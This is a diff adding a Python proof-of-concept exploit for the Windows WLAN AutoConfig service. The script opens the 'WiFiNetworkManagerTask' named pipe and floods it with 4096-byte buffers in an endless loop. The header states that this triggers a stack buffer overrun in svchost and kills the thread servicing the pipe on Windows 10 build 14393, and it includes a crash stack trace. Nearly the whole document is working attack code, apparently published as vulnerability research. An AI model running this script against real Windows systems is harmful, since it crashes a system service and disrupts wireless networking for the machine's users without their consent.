@@ -1,0 +1,59 @@
+#!/usr/bin/python
+# wlanautoconfig-poc.py
+#
+# Windows WLAN AutoConfig Named Pipe POC
+#
+# Jeremy Brown [jbrown3264/gmail]
+# Dec 2016
+#
+# >	wifinetworkmanager.dll!__FatalError(char const *,unsigned # long,char const *, ...)
+#	AsyncPipe::ReadCompletedCallback(void)
+#	AsyncPipe::Dispatch(int,void *,void *, ...)
+#	Synchronizer::EnqueueEvent(...)
+#	AsyncPipe::ReadCompletedStatic(...)
+#
+# --> STATUS_STACK_BUFFER_OVERRUN @ svchost.exe
+#
+# Tested:
+#
+# Windows 10 x86/x64 BUILD 10.0.14393 (vulnerable)
+# Windows Server 2012 R2 x64 (not vulnerable, service doesn't create pipe)
+#
+# Dependencies:
+#
+# pip install pypiwin32
+#
+# Notes:
+#
+# This won't kill Wlansvc service, but the thread servicing the pipe will terminate
+#
+
+import win32file
+import pywintypes
+import msvcrt
+
+BUF_SIZE = 4096
+PIPE_NAME = r'\\.\pipe\WiFiNetworkManagerTask'
+
+def main():
+    try:
+        handle = win32file.CreateFile(PIPE_NAME, win32file.GENERIC_WRITE, 0, None, win32file.OPEN_EXISTING, 0, None)
+    except Exception:
+        print("Error: CreateFile() failed\n")
+        return
+
+    fd = msvcrt.open_osfhandle(handle, 0)
+
+    if(fd < 0):
+        print("Error: open_osfhandle() failed\n")
+        return
+
+    buf = bytearray(b'\x42' * BUF_SIZE)
+
+    # exact number here could vary, keeping it simple
+    while True:
+        win32file.WriteFile(handle, buf)
+
+
+if __name__ == "__main__":
+    main()
